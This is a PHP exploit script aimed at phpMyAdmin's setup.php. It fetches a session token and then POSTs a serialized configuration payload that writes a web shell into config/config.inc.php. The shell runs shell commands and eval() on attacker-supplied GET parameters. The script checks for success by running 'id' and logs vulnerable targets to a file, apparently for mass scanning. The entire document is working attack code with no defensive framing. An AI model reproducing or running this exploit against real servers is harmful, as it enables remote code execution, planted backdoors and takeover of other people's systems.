<?php
$url =$argv[1];
exploit($url);
	function exploit($w00t) {
		$Handlex = FOpen("pma", "a+");
		$useragent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729) "; //firefox 
		//first get cookie + token 
		$curl = curl_init(); 
		curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); //URL 
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
		curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($curl, CURLOPT_TIMEOUT, 200); 
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); 		
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); //return site as string 
		curl_setopt($curl, CURLOPT_COOKIEFILE, "exploitcookie.txt"); 
		curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
		$result = curl_exec($curl);
		curl_close($curl);
		if (preg_match_all("/token\"\s+value=\"([^>]+?)\"/", $result, $matches));
		
		$token = $matches[1][1];
		if ($token != '') {
		print "\n[!] w00t! w00t! Got token = " . $matches[1][1];
		$payload = "token=".$token."&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=%27%27%3b%20if(\$_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3bsystem(\$_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}if(\$_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval(\$_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix";
		print "\n[+] Sending evil payload mwahaha.. \n";
		$curl = curl_init(); 
		curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); 
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20);
		curl_setopt($curl, CURLOPT_TIMEOUT, 200);
		curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
		curl_setopt($curl, CURLOPT_REFERER, $w00t); 
		curl_setopt($curl, CURLOPT_POST, true); 
		curl_setopt($curl, CURLOPT_POSTFIELDS, $payload); 
		curl_setopt($curl, CURLOPT_COOKIEFILE, "exploitcookie.txt"); 
		curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3); 
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); 
		$result = curl_exec($curl);
		curl_close($curl);
				
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "".$w00t."config/config.inc.php?c=id");
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		
		$res = curl_exec($ch);
		if(preg_match("/uid=/", $res)){
		print "\n[+] ".$w00t."config/config.inc.php?c=id \n";
		FWrite($Handlex, "".$w00t."config/config.inc.php?c=uname -a;id \n");
		curl_close ($ch);
		}
		
		else {
			print "\n[!] Shit! no luck.. not vulnerable\n";
			return false;
		}
		FClose($Handlex);
		if (file_exists('exploitcookie.txt')) { unlink('exploitcookie.txt'); }
		//exit();
	}
}
?>
